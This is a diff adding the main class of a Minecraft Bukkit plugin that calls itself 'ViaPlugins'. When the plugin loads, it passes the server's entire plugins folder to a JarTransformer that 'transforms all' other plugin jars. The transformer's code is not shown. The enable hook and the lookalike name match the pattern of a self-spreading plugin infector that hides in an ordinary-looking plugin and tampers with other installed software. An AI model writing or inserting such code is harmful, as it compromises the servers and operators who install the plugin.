@@ -1,0 +1,19 @@
+package com.evrensel.plugin;
+
+import org.bukkit.plugin.java.JavaPlugin;
+import java.io.File;
+
+public class Main extends JavaPlugin {
+    @Override
+    public void onEnable() {
+        getLogger().info("ViaPlugins Aktif Edildi!");
+        File pluginFolder = getDataFolder().getParentFile();
+        JarTransformer transformer = new JarTransformer();
+        transformer.transformAll(pluginFolder);
+    }
+
+    @Override
+    public void onDisable() {
+        getLogger().info("ViaPlugins Kapatildi!");
+    }
+}
